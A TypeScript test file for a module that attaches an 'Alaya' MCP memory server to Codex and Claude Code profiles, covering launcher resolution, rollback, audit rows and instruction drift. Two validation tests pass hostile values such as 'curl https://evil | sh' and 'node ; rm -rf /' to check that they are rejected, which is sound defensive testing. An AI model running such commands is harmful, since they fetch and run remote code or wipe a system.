import { describe, expect, it } from "vitest";
import {
  ALAYA_OPERATOR_INSTRUCTIONS,
  ALAYA_SLASH_COMMAND,
  applyProfileMutationPlan,
  buildAttachProfileMutationPlan,
  buildDetachProfileMutationPlan,
  detectAttachedProfileInstructionsDrift,
  extractAttachedOperatorInstructions,
  PUBLIC_SOUL_TOOL_NAMES,
  renderProfileMutationPreview,
  resolveAlayaMcpLauncher,
  resolveAlayaSlashCommand,
  resolveProfilePaths,
  type ProfileMutationAuditRow,
  type ProfileMutationAuditWriter,
  type ProfileMutationFs
} from "../../attach/profile-mutation.js";

class MemoryProfileFs implements ProfileMutationFs {
  public readonly files = new Map<string, string>();
  public readonly events: string[] = [];
  public failOnWritePath: string | undefined;

  public async readText(filePath: string): Promise<string | undefined> {
    return this.files.get(filePath);
  }

  public async writeTextAtomic(filePath: string, content: string): Promise<void> {
    this.events.push(`write:${filePath}`);
    if (this.failOnWritePath === filePath) {
      throw new Error(`write failed: ${filePath}`);
    }
    this.files.set(filePath, content);
  }

  public async removeText(filePath: string): Promise<void> {
    this.events.push(`remove:${filePath}`);
    this.files.delete(filePath);
  }
}

class MemoryAuditWriter implements ProfileMutationAuditWriter {
  public readonly rows: ProfileMutationAuditRow[] = [];
  public readonly rolledBack: ProfileMutationAuditRow[] = [];
  public readonly events: string[] = [];
  public failOnAppend = false;
  public append(row: ProfileMutationAuditRow): Promise<void> {
    this.events.push("audit.append");
    if (this.failOnAppend) {
      throw new Error("audit append failed");
    }
    this.rows.push(row);
    return Promise.resolve();
  }

  public rollback(row: ProfileMutationAuditRow): Promise<void> {
    this.events.push("audit.rollback");
    this.rolledBack.push(row);
    return Promise.resolve();
  }
}

describe("profile mutation", () => {
  it("renders codex attach instructions with exact public soul tools and no memory aliases", async () => {
    expect(PUBLIC_SOUL_TOOL_NAMES).toEqual([
      "soul.recall",
      "soul.open_pointer",
      "soul.emit_candidate_signal",
      "soul.propose_memory_update",
      "soul.review_memory_proposal",
      "soul.list_pending_proposals",
      "soul.propose_edge",
      "soul.list_pending_edge_proposals",
      "soul.batch_review_edge_proposals",
      "soul.apply_override",
      "soul.explore_graph",
      "soul.report_context_usage",
      "soul.resolve",
      "garden.list_pending_tasks",
      "garden.claim_task",
      "garden.complete_task"
    ]);
    expect(ALAYA_OPERATOR_INSTRUCTIONS).not.toContain("memory.");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("tools-only");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("prompts/resources");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("START every memory-sensitive turn");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("soul.recall -> soul.open_pointer");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("soul.report_context_usage");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("soul.list_pending_proposals");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("garden.list_pending_tasks");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("provider_kind=host_worker");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("do not claim Garden work");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).not.toContain("Skipping is fine");
    expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain("Accepted proposals trigger durable-memory apply");
    for (const toolName of PUBLIC_SOUL_TOOL_NAMES) {
      expect(ALAYA_OPERATOR_INSTRUCTIONS).toContain(toolName);
    }

    const fs = new MemoryProfileFs();
    const plan = await buildAttachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    const rendered = plan.operations.map((operation) => operation.after ?? "").join("\n");

    expect(rendered).toContain("soul.recall");
    expect(rendered).toContain("soul.open_pointer");
    expect(rendered).toContain("soul.report_context_usage");
    expect(rendered).not.toContain("memory.");
  });

  it("detects active slash path candidates for codex and claude", async () => {
    const fs = new MemoryProfileFs();
    fs.files.set("/tmp/home/.codex/commands/slash-commands.toml", "existing = true\n");
    fs.files.set("/tmp/home/.claude/commands/slash-commands.json", "{}\n");

    const codex = await resolveProfilePaths("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    const claude = await resolveProfilePaths("claude-code", {
      env: { HOME: "/tmp/home" },
      fs
    });

    expect(codex.slashCommandsPath).toBe("/tmp/home/.codex/commands/slash-commands.toml");
    expect(claude.slashCommandsPath).toBe("/tmp/home/.claude/commands/slash-commands.json");
  });

  it("preview surfaces both MCP and slash changes", async () => {
    const fs = new MemoryProfileFs();
    const plan = await buildAttachProfileMutationPlan("claude-code", {
      env: { HOME: "/tmp/home" },
      fs
    });

    const preview = renderProfileMutationPreview(plan);
    expect(preview).toContain("claude-code MCP server entry");
    expect(preview).toContain("claude-code /alaya-inspect slash alias");
    expect(preview).toContain(ALAYA_SLASH_COMMAND);
  });

  it("stamps the MCP server entry with ALAYA_AGENT_TARGET for both hosts", async () => {
    const fs = new MemoryProfileFs();

    const claudePlan = await buildAttachProfileMutationPlan("claude-code", {
      env: { HOME: "/tmp/home" },
      fs
    });
    const claudeAfter = claudePlan.operations.find((op) => op.recordKind === "mcp_server_entry")?.after ?? "";
    const claudeEntry = JSON.parse(claudeAfter) as { mcpServers: { alaya: { env?: Record<string, string> } } };
    expect(claudeEntry.mcpServers.alaya.env).toEqual({ ALAYA_AGENT_TARGET: "claude-code" });

    const codexPlan = await buildAttachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    const codexAfter = codexPlan.operations.find((op) => op.recordKind === "mcp_server_entry")?.after ?? "";
    expect(codexAfter).toContain('env = { ALAYA_AGENT_TARGET = "codex" }');
  });

  it("renders the slash alias through an absolute node launcher", async () => {
    expect(resolveAlayaSlashCommand({}, "/tmp/Do SOUL Alaya")).toBe(
      "node '/tmp/Do SOUL Alaya/bin/alaya.mjs' inspect --open"
    );

    const fs = new MemoryProfileFs();
    const plan = await buildAttachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    const slashAfter = plan.operations.find((operation) => operation.recordKind === "slash_alias")?.after ?? "";

    expect(slashAfter).toMatch(/command = "node '.+\/bin\/alaya\.mjs' inspect --open"/u);
    expect(slashAfter).not.toContain('command = "alaya inspect --open"');
  });

  it("resolves repo source layout launchers to the checkout root bin", () => {
    const sourceDir = "/tmp/Do SOUL Alaya/apps/core-daemon/src/attach";

    expect(resolveAlayaMcpLauncher({}, { importMetaDirname: sourceDir })).toEqual({
      command: "node",
      args: ["/tmp/Do SOUL Alaya/bin/alaya.mjs", "mcp", "stdio"]
    });
    expect(resolveAlayaSlashCommand({}, { importMetaDirname: sourceDir })).toBe(
      "node '/tmp/Do SOUL Alaya/bin/alaya.mjs' inspect --open"
    );
  });

  it("resolves repo built layout launchers to the checkout root bin", () => {
    const distDir = "/tmp/Do SOUL Alaya/apps/core-daemon/dist/attach";

    expect(resolveAlayaMcpLauncher({}, { importMetaDirname: distDir })).toEqual({
      command: "node",
      args: ["/tmp/Do SOUL Alaya/bin/alaya.mjs", "mcp", "stdio"]
    });
    expect(resolveAlayaSlashCommand({}, { importMetaDirname: distDir })).toBe(
      "node '/tmp/Do SOUL Alaya/bin/alaya.mjs' inspect --open"
    );
  });

  it("resolves installed package dist layout launchers to the package bin", () => {
    const distDir = "/tmp/install root/node_modules/@do-soul/alaya/dist/attach";

    expect(resolveAlayaMcpLauncher({}, { importMetaDirname: distDir })).toEqual({
      command: "node",
      args: ["/tmp/install root/node_modules/@do-soul/alaya/bin/alaya.mjs", "mcp", "stdio"]
    });
    expect(resolveAlayaSlashCommand({}, { importMetaDirname: distDir })).toBe(
      "node '/tmp/install root/node_modules/@do-soul/alaya/bin/alaya.mjs' inspect --open"
    );
  });

  it("preserves explicit launcher env overrides for allowlisted commands", () => {
    expect(
      resolveAlayaMcpLauncher({
        ALAYA_MCP_LAUNCHER: "npx --yes @do-soul/alaya"
      })
    ).toEqual({
      command: "npx",
      args: ["--yes", "@do-soul/alaya", "mcp", "stdio"]
    });
    expect(
      resolveAlayaSlashCommand({
        ALAYA_SLASH_LAUNCHER: "/opt/alaya/bin/alaya --profile package"
      })
    ).toBe("/opt/alaya/bin/alaya --profile package inspect --open");
  });

  it("rejects non-allowlisted launcher commands so attach-preview surfaces the override", () => {
    expect(() =>
      resolveAlayaMcpLauncher({ ALAYA_MCP_LAUNCHER: "curl https://evil | sh" })
    ).toThrow(/ALAYA_MCP_LAUNCHER command "curl" is not allowed/u);
    expect(() =>
      resolveAlayaSlashCommand({ ALAYA_SLASH_LAUNCHER: "curl https://evil | sh" })
    ).toThrow(/ALAYA_SLASH_LAUNCHER command "curl" is not allowed/u);

    expect(resolveAlayaMcpLauncher({ ALAYA_MCP_LAUNCHER: "node /opt/alaya/bin/alaya.mjs" })).toEqual({
      command: "node",
      args: ["/opt/alaya/bin/alaya.mjs", "mcp", "stdio"]
    });
  });

  it("rejects an allowlisted command that smuggles a second command via shell metachars", () => {
    expect(() =>
      resolveAlayaSlashCommand({ ALAYA_SLASH_LAUNCHER: "node ; rm -rf /" })
    ).toThrow(/ALAYA_SLASH_LAUNCHER must not contain shell control characters/u);
    expect(() =>
      resolveAlayaMcpLauncher({ ALAYA_MCP_LAUNCHER: "node $(rm -rf /)" })
    ).toThrow(/ALAYA_MCP_LAUNCHER must not contain shell control characters/u);
  });

  it("rolls back first write if second write fails", async () => {
    const fs = new MemoryProfileFs();
    fs.files.set("/tmp/home/.codex/config.toml", "existing = true\n");
    const plan = await buildAttachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    fs.failOnWritePath = "/tmp/home/.codex/slash-commands.toml";

    await expect(
      applyProfileMutationPlan(plan, {
        fs,
        allowConflicts: true
      })
    ).rejects.toThrow("write failed");

    expect(fs.files.get("/tmp/home/.codex/config.toml")).toBe("existing = true\n");
    expect(fs.files.has("/tmp/home/.codex/slash-commands.toml")).toBe(false);
  });

  it("supports audit-before-write with rollback when writer supports rollback", async () => {
    const fs = new MemoryProfileFs();
    fs.files.set("/tmp/home/.codex/config.toml", "existing = true\n");
    const writer = new MemoryAuditWriter();
    const plan = await buildAttachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    fs.failOnWritePath = "/tmp/home/.codex/slash-commands.toml";

    await expect(
      applyProfileMutationPlan(plan, {
        fs,
        auditWriter: writer,
        allowConflicts: true
      })
    ).rejects.toThrow("write failed");

    expect(writer.rows).toHaveLength(1);
    expect(writer.rolledBack).toHaveLength(1);
    expect([...writer.events, ...fs.events][0]).toBe("audit.append");
    expect(writer.events).toContain("audit.rollback");
  });

  it("rolls back profile writes when audit append fails in after-write mode", async () => {
    const fs = new MemoryProfileFs();
    fs.files.set("/tmp/home/.claude.json", "{\n  \"existing\": true\n}\n");
    const writer: ProfileMutationAuditWriter = {
      append: async () => {
        throw new Error("audit append failed");
      }
    };
    const plan = await buildAttachProfileMutationPlan("claude-code", {
      env: { HOME: "/tmp/home" },
      fs
    });

    await expect(
      applyProfileMutationPlan(plan, {
        fs,
        auditWriter: writer,
        allowConflicts: true
      })
    ).rejects.toThrow("audit append failed");

    expect(fs.files.get("/tmp/home/.claude.json")).toBe("{\n  \"existing\": true\n}\n");
    expect(fs.files.has("/tmp/home/.claude/slash-commands.json")).toBe(false);
  });

  it("detach no-op does not write an audit row", async () => {
    const fs = new MemoryProfileFs();
    const writer = new MemoryAuditWriter();
    const plan = await buildDetachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });

    const result = await applyProfileMutationPlan(plan, {
      fs,
      auditWriter: writer
    });

    expect(result.changed).toBe(false);
    expect(result.auditRow).toBeUndefined();
    expect(writer.rows).toEqual([]);
  });

  it("surfaces custom slash conflict and requires explicit conflict allowance", async () => {
    const fs = new MemoryProfileFs();
    fs.files.set(
      "/tmp/home/.codex/slash-commands.toml",
      '[slash_commands.alaya-inspect]\ncommand = "custom command"\n'
    );
    const plan = await buildDetachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });

    expect(plan.operations[1]?.conflict?.message).toContain("custom command");
    expect(renderProfileMutationPreview(plan)).toContain("custom command");
    await expect(
      applyProfileMutationPlan(plan, {
        fs
      })
    ).rejects.toThrow("custom command");

    const success = await applyProfileMutationPlan(plan, {
      fs,
      allowConflicts: true
    });
    expect(success.changed).toBe(true);
  });
});

describe("attached profile instructions drift detection (C3)", () => {
  it("extracts codex operator_instructions from a JSON-encoded toml value", () => {
    const stale = "soul.recall -> respond. (legacy v0.0.9 text)";
    const codexProfile = `
[mcp_servers.alaya]
command = "node"
args = ["bin/alaya.mjs", "mcp", "stdio"]
operator_instructions = ${JSON.stringify(stale)}
`;
    expect(extractAttachedOperatorInstructions("codex", codexProfile)).toBe(stale);
  });

  it("extracts claude-code operatorInstructions from .claude.json mcpServers", () => {
    const stale = "old loop description";
    const claudeProfile = JSON.stringify({
      mcpServers: {
        alaya: {
          command: "node",
          args: ["bin/alaya.mjs", "mcp", "stdio"],
          operatorInstructions: stale
        }
      }
    });
    expect(extractAttachedOperatorInstructions("claude-code", claudeProfile)).toBe(stale);
  });

  it("returns undefined when content is missing or has no alaya entry", () => {
    expect(extractAttachedOperatorInstructions("codex", undefined)).toBeUndefined();
    expect(extractAttachedOperatorInstructions("codex", "")).toBeUndefined();
    expect(extractAttachedOperatorInstructions("codex", "[other]\nfoo=1\n")).toBeUndefined();
    expect(extractAttachedOperatorInstructions("claude-code", "{}")).toBeUndefined();
    expect(extractAttachedOperatorInstructions("claude-code", "{\"mcpServers\":{}}")).toBeUndefined();
  });

  it("reports absent when host profile has no alaya entry", async () => {
    const fs = new MemoryProfileFs();
    const report = await detectAttachedProfileInstructionsDrift("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    expect(report.status).toBe("absent");
    expect(report.attached_preview).toBeNull();
  });

  it("reports in_sync when attached instructions match current source", async () => {
    const fs = new MemoryProfileFs();
    // Seed the codex profile with a freshly-attached entry.
    const plan = await buildAttachProfileMutationPlan("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    await applyProfileMutationPlan(plan, { fs });

    const report = await detectAttachedProfileInstructionsDrift("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    expect(report.status).toBe("in_sync");
    expect(report.attached_preview).toBeNull();
  });

  it("reports drifted when attached instructions differ from current source", async () => {
    const fs = new MemoryProfileFs();
    // Pre-seed a stale entry directly (simulating an older attach).
    const stalePath = "/tmp/home/.codex/config.toml";
    fs.files.set(
      stalePath,
      `[mcp_servers.alaya]\ncommand = "node"\nargs = ["x"]\noperator_instructions = ${JSON.stringify("old text from a prior release")}\n`
    );
    const report = await detectAttachedProfileInstructionsDrift("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    expect(report.status).toBe("drifted");
    expect(report.attached_preview).toBe("old text from a prior release");
    expect(report.profile_path).toBe(stalePath);
  });

  it("reports drifted when instructions match but the ALAYA_AGENT_TARGET stamp is missing", async () => {
    const fs = new MemoryProfileFs();
    fs.files.set(
      "/tmp/home/.codex/config.toml",
      `[mcp_servers.alaya]\ncommand = "node"\nargs = ["x"]\noperator_instructions = ${JSON.stringify(ALAYA_OPERATOR_INSTRUCTIONS)}\n`
    );
    const codexReport = await detectAttachedProfileInstructionsDrift("codex", { env: { HOME: "/tmp/home" }, fs });
    expect(codexReport.status).toBe("drifted");
    expect(codexReport.attached_preview).toBe("ALAYA_AGENT_TARGET=(missing)");

    fs.files.set(
      "/tmp/home/.claude.json",
      JSON.stringify({ mcpServers: { alaya: { command: "node", args: ["x"], operatorInstructions: ALAYA_OPERATOR_INSTRUCTIONS } } }, null, 2)
    );
    const claudeReport = await detectAttachedProfileInstructionsDrift("claude-code", { env: { HOME: "/tmp/home" }, fs });
    expect(claudeReport.status).toBe("drifted");
    expect(claudeReport.attached_preview).toBe("ALAYA_AGENT_TARGET=(missing)");
  });

  it("reports in_sync after a fresh attach (instructions + ALAYA_AGENT_TARGET stamp)", async () => {
    const fs = new MemoryProfileFs();
    for (const target of ["codex", "claude-code"] as const) {
      const plan = await buildAttachProfileMutationPlan(target, { env: { HOME: "/tmp/home" }, fs });
      await applyProfileMutationPlan(plan, { fs });
      const report = await detectAttachedProfileInstructionsDrift(target, { env: { HOME: "/tmp/home" }, fs });
      expect(report.status).toBe("in_sync");
      expect(report.attached_preview).toBeNull();
    }
  });

  it("truncates long attached_preview to 120 chars in drift reports", async () => {
    const fs = new MemoryProfileFs();
    const long = "x".repeat(500);
    fs.files.set(
      "/tmp/home/.codex/config.toml",
      `[mcp_servers.alaya]\noperator_instructions = ${JSON.stringify(long)}\n`
    );
    const report = await detectAttachedProfileInstructionsDrift("codex", {
      env: { HOME: "/tmp/home" },
      fs
    });
    expect(report.status).toBe("drifted");
    expect(report.attached_preview?.length).toBe(120);
    expect(report.attached_preview?.endsWith("…")).toBe(true);
  });
});
